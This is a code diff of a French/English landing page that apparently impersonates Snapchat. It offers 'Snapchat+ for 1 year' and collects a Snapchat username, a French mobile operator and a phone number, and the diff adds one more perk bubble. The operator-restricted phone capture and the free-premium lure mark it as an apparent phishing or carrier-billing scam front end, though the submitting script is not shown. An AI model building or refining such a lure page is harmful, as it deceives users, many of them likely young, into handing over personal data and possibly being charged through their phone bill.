@@ -11,22 +11,15 @@
 <body>
     <div class="bg-gif"></div>
     <div class="container">
-        <!-- Langue toggle -->
         <div class="lang-toggle-wrapper">
             <div class="lang-toggle">
                 <button id="langFr" class="active" onclick="setLanguage('fr')">🇫🇷 FR</button>
                 <button id="langEn" onclick="setLanguage('en')">🇬🇧 EN</button>
             </div>
         </div>
-
-        <!-- Card principale -->
         <div class="main-card">
-
-            <!-- Logo -->
             <div class="logo-section">
                 <img id="siteLogo" src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg" alt="Snaptech Logo" class="logo-preview" />
-
-                <!-- Notification animée -->
                 <div class="notif-bar">
                     <div class="notif-glow"></div>
                     <span class="notif-icon">🎉</span>
@@ -34,21 +27,14 @@
                     <span class="notif-badge">Just now</span>
                 </div>
             </div>
-
-            <!-- Titre -->
-            <h1 id="mainTitle" class="main-title">
-                🎉 Activer Snapchat+ pendant 1 an !
-            </h1>
-
-            <!-- Bulles d'avantages -->
+            <h1 id="mainTitle" class="main-title">🎉 Activer Snapchat+ pendant 1 an !</h1>
             <div class="bubbles-container">
                 <span class="bubble">✨ Filtres exclusifs</span>
                 <span class="bubble">📌 Stories épinglées</span>
                 <span class="bubble">👁️ Voir qui a revu</span>
                 <span class="bubble">⭐ Badge personnalisé</span>
+                <span class="bubble">🎁 Accès anticipé</span>
             </div>
-
-            <!-- Localisation -->
             <div class="form-group">
                 <label for="location" id="locationLabel">📍 Localisation</label>
                 <select id="location" class="form-control" onchange="updateOperators()">
@@ -56,20 +42,14 @@
                     <option value="belgique">🇧🇪 Belgique</option>
                 </select>
             </div>
-
-            <!-- Message de prévention -->
             <div class="warning-message">
                 <p id="warningMsg">⚠️ Disponible uniquement pour les numéros France des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas</p>
             </div>
-
-            <!-- Nom d'utilisateur Snapchat -->
             <div class="form-group">
                 <label for="username" id="usernameLabel">👤 Nom d'utilisateur Snapchat</label>
                 <input type="text" id="username" placeholder="ex: snapmaster" class="form-control" autocomplete="off" />
                 <small id="usernameHint" style="color:#6b7280; font-size:0.8rem; margin-left:12px;">3 à 15 caractères (lettres, chiffres, . _ -)</small>
             </div>
-
-            <!-- Opérateurs -->
             <div class="form-group">
                 <p id="operatorLabel" class="operator-label">📱 Opérateur mobile</p>
                 <div class="operator-buttons" id="operatorButtons">
@@ -78,32 +58,19 @@
                     <button class="btn-operator" data-operator="bouygues" onclick="selectOperator(this)">Bouygues</button>
                 </div>
             </div>
-
-            <!-- Numéro de téléphone -->
             <div class="form-group">
                 <label for="phone" id="phoneLabel">📞 Numéro de téléphone</label>
                 <input type="tel" id="phone" placeholder="06 12 34 56 78" class="form-control" autocomplete="off" />
             </div>
-
-            <!-- Bouton d'activation -->
-            <button onclick="submitForm()" id="submitBtn" class="btn-primary">
-                🚀 Activer Snapchat+
-            </button>
-
-            <!-- Message de statut -->
+            <button onclick="submitForm()" id="submitBtn" class="btn-primary">🚀 Activer Snapchat+</button>
             <div id="statusMsg" class="status-message"></div>
-
-            <!-- File d'attente hors-ligne -->
             <div id="offlineQueue" style="margin-top:12px; text-align:center; font-size:0.85rem; color:#6b7280; display:none;">
                 <span id="queueCount">0</span> requête(s) en attente de synchronisation
                 <button onclick="syncPendingRequests()" style="margin-left:8px; background:none; border:none; color:#000; text-decoration:underline; cursor:pointer;">Synchroniser</button>
             </div>
         </div>
-
-        <!-- Footer -->
         <p class="footer-text">Snaptech © 2026 — Tous droits réservés</p>
     </div>
-
     <script src="script.js"></script>
 </body>
 </html>
